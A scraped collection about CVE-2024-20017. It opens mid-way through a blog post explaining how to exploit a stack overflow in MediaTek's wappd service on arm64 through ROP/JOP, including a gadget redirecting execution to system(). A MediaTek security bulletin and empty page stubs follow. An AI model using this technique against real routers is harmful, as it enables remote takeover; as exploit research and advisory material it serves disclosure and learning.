     + moves values in `x24` to `x0` (`x0` is used to pass first arg to the called function)
     + jumps to the value in `x22`
3. Provide the address to `system()` and the address of the shell command from step 1 so they can be used by the ROP gadget. These values will be loaded in registers when the corrupted return address is used and exec jumps to the ROP gadget.
   * address where shell command string was written -> loaded into x0
   * address of `system().plt` -> loaded into x22
4. Corrupt the `pPktBuf`, `pCmdBuf`, and `pRspBuf` pointers to set them to NULL to avoid triggering libc malloc sanity checks when these pointers are freeâd in `IAPP_RcvHandler()` during termination
5. Redirect execution to `system()` after having set up the argument (i.e. the address to the shell command written in step 1)

The first two steps are pretty simple. We write the shell command we want executed right at the
start of the payload; since weâve corrupted `pPktBuf` to point to a known location and thatâs where
this second payload will be written, we can predict where this string will be located. In this case,
as `pPktBuf` has been set to the start of the .bss segment, the command string will be located 16
bytes into the .bss segment (to account for the packet header and other fields of the SB packet
struct). For step two, we know the offset into the overflow where the saved return address for
`IAPP_RcvHandler()` is located, so we simply overwrite that location with the address of the ROP
gadget weâll use to set up arguments and redirect execution to `system()`.

Letâs take a moment to talk about that ROP gadget and ROP in general on arm64 vs. x86. As mentioned
before, the return semantics are different in arm64 vs x86, which means the gadgets work a little
differently. In particular, ROP gadgets in arm64 donât just need to end in a `ret` in order to be
useful; they have to end with the correct stack operation to pop the next value on the stack into
`x30` before executing the `ret`. This combined with the fact that arm64 has many more general
purpose registers vs. x86 means that the likelihood of finding gadgets that make use of registers
you can control and that *also* properly set up for the `ret` is much lower vs. x86, where there are
only a handful of registers that are used and whatever is next on the stack is used automatically on
`ret`.

Anyway, the gadget used in the final exploit is technically a JOP (Jump Oriented Programming) gadget
so we avoid the issue with `ret` entirely. Rather than using `ret` to redirect execution, JOP
gadgets jump directly to a value stored in a register. We get lucky in that weâre able to control a
handful of registers at the time when execution is redirected to the gadget. Two of those registers
are `x22` and `x24`, so weâre able to use the following gadget, which simply moves the value in
`x24` to `x0` (the register used to pass the first arg to a function) and then jumps to the address
in `x22`:

```
mov x0, x24;   # we'll put the addr of the shell command string in x24
blr x22;       # and the address of `system()` in x22

```

Going back to the remainder of the exploit, the only other thing that needs to be done is corrupt
the `pPktBuf`, `pCmdBuf`, and `pRspBuf` pointers to set them each to NULL. We do this because at the
end of `IAPP_RcvHandler()`, prior to returning and using our corrupted return address, these
pointers will be passed to `free()` if theyâre not NULL. If theyâre still pointing to the previous
locations we set them to, weâll end up triggering libc mallocâs sanity checks and trigger an
`abort()` before weâre able to redirect execution.

With all of that in place, we arrive at the Promised Land:

![mtk-wapp-exploit-wax206.png](/assets/images/mtk-wapp-exploit-wax206.png)

## bonus: triggering a kernel bug by performing arbitrary IOCTL calls via JOP

As a final bonus, what if you could write one exploit for two completely separate vulns? Like if
there happened to be a bug in a kernel driver that could only be reached locally and a separate bug
in a network service that could be exploited remotelyâ¦? Well, you might have to do some wacky
stuff like use a JOP chain to open a new socket, construct an `iwreq` struct in memory to pass to
the kernel, set up arguments, and trigger a call to `ioctl()`. But if you can find a wayâ¦

![mtk-wapp-exploit-rop2kernel.png](/assets/images/mtk-wapp-exploit-rop2kernel.png)

Why do this rather than just use the command exec to download the kernel exploit and run it? Just to
show you can ;)

## wrapping up

This post ended up being much longer than I had initially intended it to be! I hope I provided
enough info along the way without making it boring or (too) confusing. I also hope itâs helpful to
anyone looking to learn more about exploit development and that it can provide some insight into the
different approaches that can be taken in different circumstances. Exploiting a stack buffer
overflow is fundamentally the same across all codebases â itâs everything else around the overflow
that makes it interesting and challenging. Itâs like working on an intricate puzzle where thereâs no
guarantee all of the pieces will fit together but thereâs also more than one way to solve it. This
is what makes exploit development fun for me and why Iâd go through the trouble of writing 4
different exploits for the same bug. This shit breaks your brain a little lol.

## references

* [Exploit code](https://github.com/mellow-hype/cve-2024-20017)
* [NVD - CVE-2024-20017](https://nvd.nist.gov/vuln/detail/CVE-2024-20017)
* [MediaTek March 2024
  Advisory](https://corp.mediatek.com/product-security-bulletin/March-2024)
* [Fuzzotron](https://github.com/denandz/fuzzotron)
* [OpenWrt MT7622 images
  page](https://downloads.openwrt.org/snapshots/targets/mediatek/mt7622/)

+ [hyprdude](https://twitter.com/hyprdude)
+ [mellow-hype](https://github.com/mellow-hype)
+ [hypr](https://infosec.exchange/%40hypr)

"angelheaded hipsters burning for the ancient heavenly connection to the starry dynamo in the machinery
of night"



=== Content from corp.mediatek.com_f0df7007_20250110_193027.html ===


[![MediaTek](https://cdn-www.mediatek.com/icons/mtklogo.svg)](/)

English

* [简体中文](https://corp.mediatek.cn/product-security-bulletin/March-2024)
* [繁體中文](https://corp.mediatek.tw/product-security-bulletin/March-2024)

* Products & Technology
  + [Overview](https://corp.mediatek.com/back-to-the-marketing-site)
  - [Overview](https://corp.mediatek.com/back-to-the-marketing-site)
  * [Overview](https://corp.mediatek.com/back-to-the-marketing-site)
  * Pumpkin Software
  * MiraVision for Smartphones
* Investor Relations
  + Financial Information
    - [Overview](https://corp.mediatek.com/investor-relations/financial-information)
    - Monthly Revenue
    - Quarterly Earnings Release
    - Financial Reports
    - Annual Reports
      * [Overview](https://corp.mediatek.com/investor-relations/financial-information/annual-reports)
      + [Overview](https://corp.mediatek.com/investor-relations/financial-information/annual-reports)
      + 1. Financial Status
      + 2. Operating Results
      + 3. Cash Flow Analysis
      + 4. Major Capital Expenditure
      + 5. Investment Policies
      + 6. Risk Management
      + 1. Condensed Balance Sheet
      + 2. Condensed Statements of Comprehensive Income / Statements of Income
      + 3. Auditors’ Opinions from 2012 to 2016
      + 4. Five Year Financial Analysis
      + 1. Financial Status
      + 2. Operating Results
      + 3. Cash Flow Analysis
      + 4. Major Capital Expenditure
      + 5. Investment Policies
      + 6. Risk Management
      + 1. Condensed Balance Sheet
      + 2. Condensed Statements of Comprehensive Income / Statements of Income
      + 3. Auditors’ Opinions from 2011 to 2015
      + 4. Five-Year Financial Analysis
      + 1. Financial Status
      + 2. Operating Results
      + 3. Cash Flow Analysis
      + 4. Major Capital Expenditure
      + 5. Investment Policies
      + 6. Risk Management
      + 1. Condensed Balance Sheets
      + 2. Condensed Statements of Comprehensive Income / Statements of Income
      + 3. Auditors’ Opinions from 2010 to 2014
      + 4. Five-Year Financial Analysis
      + 1. Financial Status
      + 2. Operating Results
      + 3. Cash Flow Analysis
      + 4. Major Capital Expenditure
      + 5. Investment Policies
      + 6. Risk Management
      + 1. Condensed Balance Sheets
      + 2. Condensed Income Statement
      + 3. Independent Auditors’ Opinions
      + 4. Financial Statements for the Past 5 Years
* MediaTek ESG Highlight
* Dividend History
* Shareholder Services
  + Shareholder Meetings
  + Analyst Coverage
  + Transfer Agent Contact
  + Stock Quote
  + Material Information
  + M.O.P.S (2454)
* FAQ
* Investor News
* Events Calendar
* Contact Investor Relations
* Corporate Governance
  + [Overview](https://corp.mediatek.com/investor-relations/corporate-governance)
  + Board of Directors
  + Audit Committee
  + Remuneration Committee
  + M&A Strategy Committee
  + Corporate Management
  + Internal Auditing

- About
  * About MediaTek
  * Everyday Genius
  * Awards & Recognition
  * MediaTek Ventures
  * MediaTek Foundation
  * Office Locations
    + [Overview](https://corp.mediatek.com/about/office-locations)
    + China Offices
    + Dubai Offices
    + Finland Offices
    + Germany Offices
    + India Offices
    + Japan Offices
    + Korea Offices
    + Singapore Offices
    + Sweden Offices
    + Taiwan Offices
    + United Kingdom Offices
    + United States Offices
  * Subsidiary Information
  * Careers
    + [Overview](https://corp.mediatek.com/about/careers)
    - [Overview](https://corp.mediatek.com/about/careers)
    - China
      * [Overview](https://corp.mediatek.com/about/careers/internships/china-internships)
      * Gan Tang, Wireless Communications Intern
      * Han-bin, Wireless Communications Intern
      * 王琦
      * 黄帅凯
      * 李先驰, Wireless Communications Technology Intern
      * 王俊, HTD Intern
      * 吴波, HTD Intern
      * Shangjie, IOT Intern
      * Xiye, MB Intern
    - Europe
      * [Overview](https://corp.mediatek.com/about/careers/internships/europe-internships)
      * Adamos, Digital Design Verification Intern, Cambourne (Cambridge), UK
      * Alex, Communications Software Automation Intern, Cambourne (Cambridge), UK
      * Jacob, Communications Software Automation Intern, Cambourne (Cambridge), UK
      * Kip, Design Verification Intern, Kent, UK
      * Moji, Advanced Digital Communication Systems Modelling intern, Cambourne (Cambridge), UK
      * Sisi, Compute Platform Modelling Intern, Cambourne (Cambridge), UK
      * Sophie, Communications Software Automation Intern, Cambourne (Cambridge), UK
    - India
      * [Overview](https://corp.mediatek.com/about/careers/internships/india-internships)
      * Subhalaxmi Sahoo, SOC Verification Intern
      * Manjunatha, DT Intern
    - Korea​
    - Singapore
      * [Overview](https://corp.mediatek.com/about/careers/internships/singapore-internships)
      * Meng Yuan, RF Design Intern
      * Skandkumar Sharma, RF Design Intern
      * Raahgini Chandrasegaran, Innovation Center Singapore
      * Jesslyn, ADCT Department Intern
    - Taiwan
      * [Overview](https://corp.mediatek.com/about/careers/internships/taiwan-internships)
      * Arthur, CSD Intern
      * Jia-Jen, RF Design IO Intern
      * Jieng-Wuen, Corporate Strategy Intern
      * Wen-Wei, Wireless Communications Department Intern
    - United States
      * [Overview](https://corp.mediatek.com/about/careers/internships/united-states-internships)
      * Ahmad, RF Systems Design Intern
      * Thomas, High Performance Technology Intern
      * Hsin-Hui, Design Technology Intern
      * Michael, WCT Intern
      * Tzu-Chien, WCT Intern
      * Samuel, SPE Team Intern
      * Cho-Hsin, CSD Department Intern
- Contact Us
- Sustainability
  * [Overview](https://corp.mediatek.com/about/sustainability)
  * Overview
    + Chairman’s Remarks
    + ESG Committee
    + Materiality Assessments
    + Vision & ESG Highlights
    + Global Footprint
    + Stakeholder Engagement
  * Global Presence
    + Brand Vision
    + Customer Services
  * Innovation
  * Talent
    + Diverse Talents
    + Talent Attraction and Retention
    + Employee Development
    + Employee Experience
    + Occupational Health and Safety
    + DEI@MediaTek
  * Environmental Management
    + Climate Risk and Opportunity Management
    + Environmental Management
    + 2050 Net Zero Goals
    + Sustainable Supply Chain
  * Community Engagement
- News
  * Press Room
  * Media Assets
  * Events
- Blog

* Language
  + [English](https://corp.mediatek.com/product-security-bulletin/March-2024)
  + [简体中文](https://corp.mediatek.cn/product-security-bulletin/March-2024)
  + [繁體中文](https://corp.mediatek.tw/product-security-bulletin/March-2024)

* [Home](https://corp.mediatek.com/)
  + [Products & Technology](https://corp.mediatek.com/back-to-the-marketing-site)
  + [Investor Relations](https://corp.mediatek.com/investor-relations)
  + [About](https://corp.mediatek.com/about)
  + [News](https://corp.mediatek.com/news-events)
  + [Blog](https://corp.mediatek.com/tek-talk)
* [March 2024](https://corp.mediatek.com/product-security-bulletin/March-2024)

[Announcement](/security-announcement)

[Report Vulnerability](/security-contact)

[Disclosure Policy](/vulnerability-disclosure-policy)

[Security Bulletin](/product-security-bulletin)

[Acknowledgements](/product-security-acknowledgements)

# March 2024 Product Security Bulletin

Published 2024-03-04 | Updated 2024-03-06

The MediaTek Product Security Bulletin contains details of security vulnerabilities affecting MediaTek Smartphone, Tablet, AIoT, Smart display, Smart platform, OTT, Wi-Fi, TV, Computer Vision and Audio chipsets. Device OEMs have been notified of all the issues and the corresponding security patches for at least two months before publication.

The severity of the identified vulnerabilities was conducted based on the Common Vulnerability Scoring System version 3.1 (CVSS v3.1).

#### **Summary**

| Severity | **CVEs** |
| --- | --- |
| High | [CVE-2024-20017](#CVE_2024_20017), [CVE-2024-20020](#CVE_2024_20020), [CVE-2024-20018](#CVE_2024_20018), [CVE-2024-20019](#CVE_2024_20019), [CVE-2024-20005](#CVE_2024_20005), [CVE-2024-20022](#CVE_2024_20022), [CVE-2024-20023](#CVE_2024_20023), [CVE-2024-20024](#CVE_2024_20024), [CVE-2024-20025](#CVE_2024_20025), [CVE-2024-20026](#CVE_2024_20026), [CVE-2024-20027](#CVE_2024_20027), [CVE-2024-20028](#CVE_2024_20028) |
| Medium | [CVE-2024-20030](#CVE_2024_20030), [CVE-2024-20031](#CVE_2024_20031), [CVE-2024-20029](#CVE_2024_20029), [CVE-2024-20032](#CVE_2024_20032), [CVE-2024-20033](#CVE_2024_20033), [CVE-2024-20034](#CVE_2024_20034), [CVE-2024-20036](#CVE_2024_20036), [CVE-2024-20037](#CVE_2024_20037), [CVE-2024-20038](#CVE_2024_20038) |

#### **Details**

| CVE | **CVE-2024-20017** |
| --- | --- |
| Title | Improper input validation in wlan service |
| Severity | High |
| Vulnerability Type | RCE |
| CWE | CWE-20 Improper Input Validation |
| Description | In wlan service, there is a possible out of bounds write due to improper input validation. This could lead to remote code execution with no additional execution privileges needed. User interaction is not needed for exploitation |
| Affected Chipsets | MT6890, MT7622, MT7915, MT7916, MT7981, MT7986 |
| Affected Software Versions | SDK version 7.4.0.1 and before (for MT7622 and MT7915) / SDK version 7.6.7.0 and before (for MT7916, MT7981 and MT7986) / OpenWrt 19.07, 21.02 (for MT6890) |
| Report Source | External |

| CVE | **CVE-2024-20020** |
| --- | --- |
| Title | Out-of-bounds write in OPTEE |
| Severity | High |
| Vulnerability Type | ID |
| CWE | CWE-787 Out-of-bounds Write |
| Description | In OPTEE, there is a possible out of bounds write due to an incorrect bounds check. This could lead to local information disclosure if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT2713, MT2715, MT8173, MT8188, MT8195, MT8390, MT8395 |
| Affected Software Versions | Android 13.0 |
| Report Source | External |

| CVE | **CVE-2024-20018** |
| --- | --- |
| Title | Improper input validation in wlan driver |
| Severity | High |
| Vulnerability Type | EoP |
| CWE | CWE-20 Improper Input Validation |
| Description | In wlan driver, there is a possible out of bounds write due to improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. |
| Affected Chipsets | MT7615 |
| Affected Software Versions | SDK version 5.1.0.0 and before |
| Report Source | External |

| CVE | **CVE-2024-20019** |
| --- | --- |
| Title | Missing release of memory after effective lifetime in wlan driver |
| Severity | High |
| Vulnerability Type | DoS |
| CWE | CWE-401 Missing Release of Memory after Effective Lifetime |
| Description | In wlan driver, there is a possible memory leak due to improper input handling. This could lead to remote denial of service with no additional execution privileges needed. User interaction is not needed for exploitation. |
| Affected Chipsets | MT7925, MT7927 |
| Affected Software Versions | SW package release 2023.11.10 and before |
| Report Source | Internal |

| CVE | **CVE-2024-20005** |
| --- | --- |
| Title | Improper access control in da |
| Severity | High |
| Vulnerability Type | EoP |
| CWE | CWE-284 Improper Access Control |
| Description | In da, there is a possible permission bypass due to a missing permission check. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6761, MT6762, MT6763, MT6765, MT6768, MT6769, MT6771, MT6779, MT6781, MT6785, MT6789, MT6833, MT6835, MT6853, MT6853T, MT6855, MT6873, MT6875, MT6877, MT6879, MT6883, MT6885, MT6886, MT6889, MT6891, MT6893, MT6895, MT6983, MT6985, MT8666, MT8666A, MT8666B, MT8667, MT8673, MT8675, MT8676, MT8678 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | Internal |

| CVE | **CVE-2024-20022** |
| --- | --- |
| Title | Improper privilege management in lk |
| Severity | High |
| Vulnerability Type | EoP |
| CWE | CWE-269 Improper Privilege Management |
| Description | In lk, there is a possible escalation of privilege due to a missing bounds check. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT2737, MT6789, MT6835, MT6855, MT6879, MT6880, MT6886, MT6890, MT6895, MT6980, MT6983, MT6985, MT6989, MT6990, MT8321, MT8385, MT8666, MT8667, MT8673, MT8765, MT8766, MT8768, MT8781, MT8786, MT8788, MT8789, MT8791, MT8796, MT8797, MT8798 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 / OpenWrt 19.07, 21.02 / Yocto 3.3 / RDK-B 22Q3 |
| Report Source | Internal |

| CVE | **CVE-2024-20023** |
| --- | --- |
| Title | Out-of-bounds write in flashc |
| Severity | High |
| Vulnerability Type | EoP |
| CWE | CWE-787 Out-of-bounds Write |
| Description | In flashc, there is a possible out of bounds write due to lack of valudation. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT2713, MT2737, MT6781, MT6789, MT6835, MT6855, MT6879, MT6880, MT6886, MT6890, MT6895, MT6980, MT6983, MT6985, MT6989, MT6990, MT8188, MT8188T, MT8370, MT8390, MT8673, MT8676, MT8678 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 / OpenWrt 19.07, 21.02 / Yocto 3.3 / RDK-B 22Q3 |
| Report Source | Internal |

| CVE | **CVE-2024-20024** |
| --- | --- |
| Title | Out-of-bounds write in flashc |
| Severity | High |
| Vulnerability Type | EoP |
| CWE | CWE-787 Out-of-bounds Write |
| Description | In flashc, there is a possible out of bounds write due to lack of valudation. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6781, MT6789, MT6833, MT6835, MT6879, MT6886, MT6895, MT6983, MT6985, MT6989, MT8666, MT8666A, MT8666B, MT8667, MT8673, MT8676, MT8678 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | Internal |

| CVE | **CVE-2024-20025** |
| --- | --- |
| Title | Improper check or handling of exceptional conditions in da |
| Severity | High |
| Vulnerability Type | EoP |
| CWE | CWE-703 Improper Check or Handling of Exceptional Conditions |
| Description | In da, there is a possible out of bounds write due to an integer overflow. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6739, MT6757, MT6761, MT6763, MT6765, MT6768, MT6771, MT6779, MT6785, MT6833, MT6853, MT6873, MT6877, MT6885, MT6893, MT8167, MT8168, MT8173, MT8175, MT8185, MT8195, MT8321, MT8362A, MT8365, MT8385, MT8395, MT8666, MT8673, MT8678, MT8765, MT8766, MT8768, MT8781, MT8786, MT8788, MT8789, MT8791, MT8791T, MT8796, MT8797, MT8798 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | Internal |

| CVE | **CVE-2024-20026** |
| --- | --- |
| Title | Out-of-bounds read in da |
| Severity | High |
| Vulnerability Type | ID |
| CWE | CWE-125 Out-of-bounds Read |
| Description | In da, there is a possible information disclosure due to improper input validation. This could lead to local information disclosure if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6739, MT6757, MT6761, MT6763, MT6765, MT6768, MT6771, MT6779, MT6785, MT6833, MT6853, MT6873, MT6877, MT6885, MT6893, MT8163, MT8167, MT8168, MT8512 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | Internal |

| CVE | **CVE-2024-20027** |
| --- | --- |
| Title | Improper input validation in da |
| Severity | High |
| Vulnerability Type | EoP |
| CWE | CWE-20 Improper Input Validation |
| Description | In da, there is a possible out of bounds write due to improper input validation. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6739, MT6757, MT6761, MT6763, MT6765, MT6768, MT6771, MT6779, MT6785, MT6833, MT6853, MT6873, MT6877, MT6885, MT6893, MT8163, MT8167, MT8168, MT8512 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | Internal |

| CVE | **CVE-2024-20028** |
| --- | --- |
| Title | Improper input validation in da |
| Severity | High |
| Vulnerability Type | EoP |
| CWE | CWE-20 Improper Input Validation |
| Description | In da, there is a possible out of bounds write due to lack of valudation. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6739, MT6757, MT6761, MT6763, MT6765, MT6768, MT6771, MT6779, MT6785, MT6833, MT6853, MT6873, MT6877, MT6885, MT6893, MT8163, MT8167, MT8168, MT8512 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | Internal |

| CVE | **CVE-2024-20030** |
| --- | --- |
| Title | Improper input validation in da |
| Severity | Medium |
| Vulnerability Type | ID |
| CWE | CWE-20 Improper Input Validation |
| Description | In da, there is a possible information disclosure due to improper input validation. This could lead to local information disclosure if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6739, MT6757, MT6761, MT6763, MT6765, MT6768, MT6771, MT6779, MT6785, MT6833, MT6853, MT6873, MT6877, MT6885, MT6893, MT8167, MT8168, MT8195, MT8512 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | Internal |

| CVE | **CVE-2024-20031** |
| --- | --- |
| Title | Improper input validation in da |
| Severity | Medium |
| Vulnerability Type | EoP |
| CWE | CWE-20 Improper Input Validation |
| Description | In da, there is a possible out of bounds write due to lack of valudation. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6739, MT6757, MT6761, MT6763, MT6765, MT6768, MT6771, MT6779, MT6785, MT6833, MT6853, MT6873, MT6877, MT6885, MT6893, MT8163, MT8167, MT8168, MT8512 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | Internal |

| CVE | **CVE-2024-20029** |
| --- | --- |
| Title | Improper input validation in wlan firmware |
| Severity | Medium |
| Vulnerability Type | EoP |
| CWE | CWE-20 Improper Input Validation |
| Description | In wlan firmware, there is a possible out of bounds write due to improper input validation. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6985, MT6989, MT8678, MT8796 |
| Affected Software Versions | Android 13.0, 14.0 |
| Report Source | Internal |

| CVE | **CVE-2024-20032** |
| --- | --- |
| Title | Improper privilege management in aee |
| Severity | Medium |
| Vulnerability Type | EoP |
| CWE | CWE-269 Improper Privilege Management |
| Description | In aee, there is a possible permission bypass due to a missing permission check. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6580, MT6739, MT6761, MT6765, MT6768, MT6779, MT6781, MT6785, MT6789, MT6833, MT6835, MT6853, MT6855, MT6873, MT6877, MT6879, MT6883, MT6885, MT6886, MT6889, MT6893, MT6895, MT6983, MT6985, MT6989, MT8321, MT8673, MT8765, MT8766, MT8768, MT8781, MT8789, MT8791, MT8792, MT8796 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | External |

| CVE | **CVE-2024-20033** |
| --- | --- |
| Title | Out-of-bounds read in nvram |
| Severity | Medium |
| Vulnerability Type | ID |
| CWE | CWE-125 Out-of-bounds Read |
| Description | In nvram, there is a possible information disclosure due to a missing bounds check. This could lead to local information disclosure if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT2713, MT6739, MT6761, MT6765, MT6768, MT6771, MT6779, MT6785, MT6789, MT6835, MT6855, MT6879, MT6883, MT6885, MT6886, MT6893, MT6895, MT6983, MT6985, MT8167, MT8167S, MT8168, MT8173, MT8175, MT8185, MT8188, MT8195, MT8321, MT8362A, MT8365, MT8370, MT8385, MT8390, MT8395, MT8666, MT8667, MT8673, MT8675, MT8676, MT8678, MT8755, MT8765, MT8766, MT8768, MT8775, MT8781, MT8786, MT8788, MT8789, MT8791, MT8792, MT8796, MT8797, MT8798 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | External |

| CVE | **CVE-2024-20034** |
| --- | --- |
| Title | Out-of-bounds write in battery |
| Severity | Medium |
| Vulnerability Type | EoP |
| CWE | CWE-787 Out-of-bounds Write |
| Description | In battery, there is a possible escalation of privilege due to a missing bounds check. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6761, MT6765, MT6768, MT6855, MT6895, MT8167, MT8168, MT8188, MT8321, MT8765, MT8766, MT8768, MT8781, MT8786, MT8788, MT8789, MT8791T, MT8797, MT8798 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | External |

| CVE | **CVE-2024-20036** |
| --- | --- |
| Title | Improper access control in vdec |
| Severity | Medium |
| Vulnerability Type | ID |
| CWE | CWE-284 Improper Access Control |
| Description | In vdec, there is a possible permission bypass due to a permissions bypass. This could lead to local information disclosure if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6835, MT6855, MT6879, MT6886, MT6895, MT6983, MT6985, MT8792, MT8796, MT8798 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | Internal |

| CVE | **CVE-2024-20037** |
| --- | --- |
| Title | Write-what-where condition in pq |
| Severity | Medium |
| Vulnerability Type | EoP |
| CWE | CWE-123 Write-what-where Condition |
| Description | In pq, there is a possible write-what-where condition due to an incorrect bounds check. This could lead to local escalation of privilege if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6739, MT6761, MT6765, MT6768, MT6779, MT6781, MT6785, MT6789, MT6833, MT6835, MT6853, MT6855, MT6873, MT6877, MT6879, MT6883, MT6885, MT6886, MT6889, MT6893, MT6895, MT6897, MT6983, MT6985, MT6989, MT8168, MT8188, MT8195, MT8673, MT8675 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | External |

| CVE | **CVE-2024-20038** |
| --- | --- |
| Title | Out-of-bounds read in pq |
| Severity | Medium |
| Vulnerability Type | ID |
| CWE | CWE-125 Out-of-bounds Read |
| Description | In pq, there is a possible out of bounds read due to an incorrect bounds check. This could lead to local information disclosure if a malicious actor has already obtained the System privilege. User interaction is not needed for exploitation. |
| Affected Chipsets | MT6739, MT6761, MT6765, MT6768, MT6779, MT6781, MT6785, MT6789, MT6833, MT6835, MT6853, MT6855, MT6873, MT6877, MT6879, MT6883, MT6885, MT6886, MT6889, MT6893, MT6895, MT6897, MT6983, MT6985, MT6989, MT8168, MT8188, MT8195, MT8673, MT8675 |
| Affected Software Versions | Android 12.0, 13.0, 14.0 |
| Report Source | External |

#### **Vulnerability Type Definition**

| Abbreviation | **Definition** |
| --- | --- |
| RCE | Remote Code Execution |
| EoP | Elevation of Privilege |
| ID | Information Disclosure |
| DoS | Denial of Service |
| N/A | Classification not available |

#### **Versions**

| **Version** | **Date** | **Description** |
| --- | --- | --- |
| 1.0 | March 4, 2024 | Bulletin published. |
| 1.1 | March 6, 2024 | CVE table updated. |
| 1.2 | January 10, 2025 | Report Source information has been added to all the CVEs. |

#### **Notes**

Information above is generated only at the time of creation of this Security Bulletin. The list of affected chipsets could be not complete. For any further information, device OEMs can reach your MediaTek contact person if needed.

If you want to report a security vulnerability in MediaTek chipsets or products, please go to [Report Security Vulnerability](https://www.mediatek.com/security-contact) page on MediaTek website.

ABOUT MEDIATEK
[About Us](https://corp.mediatek.com/about/mediatek "About Us")
[Office Locations](https://corp.mediatek.com/about/office-locations "Office Locations")
[Careers](https://careers.mediatek.com/eREC/?langKey=en-US&langKey=en-US "Careers")
[Contact Us](https://corp.mediatek.com/about/contact-us "Contact Us")

NEWS
[Press Room](https://corp.mediatek.com/news-events/press-releases "Press Room")
[Blog](https://corp.mediatek.com/blog "Blog")
[Media Assets](https://corp.mediatek.com/news-events/press-library "Media Assets")
[Berita & Media - Indonesia](https://i.mediatek.com/pr-mediatek-id "Berita & Media - Indonesia")
[Press Room – ประเทศไทย](https://i.mediatek.com/pr-mediatek-th "Press Room – ประเทศไทย")
[Tin tức - Việt Nam](https://i.mediatek.com/pr-mediatek-vt "Tin tức - Việt Nam")

INVESTOR RELATIONS
[Financial Information](https://corp.mediatek.com/investor-relations/financial-information "Financial Information")
[Shareholder Meetings](https://corp.mediatek.com/investor-relations/shareholder-services/shareholder-meetings "Shareholder Meetings")
[Corporate Governance](https://corp.mediatek.com/investor-relations/corporate-governance "Corporate Governance")
[Investor News](https://corp.mediatek.com/investor-relations/investor-relation-news "Investor News")
[Investor Calendar](https://corp.mediatek.com/investor-relations/ir-events "Investor Calendar")

DISCOVER
[Report Vulnerability](https://corp.mediatek.com/security-contact "Report Vulnerability")
[MediaTek Foundation](https://corp.mediatek.com/about/mediatek-foundation "MediaTek Foundation")
[MediaTek Ventures](https://corp.mediatek.com/about/ventures "MediaTek Ventures")

JOIN OUR NEWSLETTER

SUBMIT

[![](https://cdn-www.mediatek.com/icons/icon_youtube.svg)](https://www.youtube.com/mediatek)
[![](https://cdn-www.mediatek.com/icons/icon_twitter.svg)](https://twitter.com/MediaTek)
[![](https://cdn-www.mediatek.com/icons/icon_fb.svg)](https://www.facebook.com/MediaTek)
[![](https://cdn-www.mediatek.com/icons/icon_linkedin.svg)](https://www.linkedin.com/company/17763)

[Cookie Statement](/cookie-statement)
[Legal Notice](/legal-notice)
[Privacy Policy](/privacy-policy)

© 2025 MediaTek Inc. All Rights Reserved

Please enable JavaScript



=== Content from blog.sonicwall.com_a0d14109_20250110_193026.html ===



=== Content from news.ycombinator.com_5f332193_20250110_193028.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D41605680) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
